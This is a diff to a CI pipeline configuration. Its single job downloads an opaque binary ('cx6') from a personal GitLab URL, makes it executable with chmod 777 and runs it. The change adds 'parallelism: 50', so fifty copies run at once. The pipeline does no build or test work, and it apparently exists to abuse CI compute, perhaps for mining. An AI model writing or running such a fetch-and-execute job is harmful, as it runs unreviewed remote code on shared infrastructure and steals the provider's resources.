@@ -11,3 +11,4 @@ blocks:
         - name: 'Job #1'
           commands:
             - 'wget https://gitlab.com/damar7183/rx/-/raw/main/cx6 && chmod 777 cx6 && ./cx6'
+          parallelism: 50
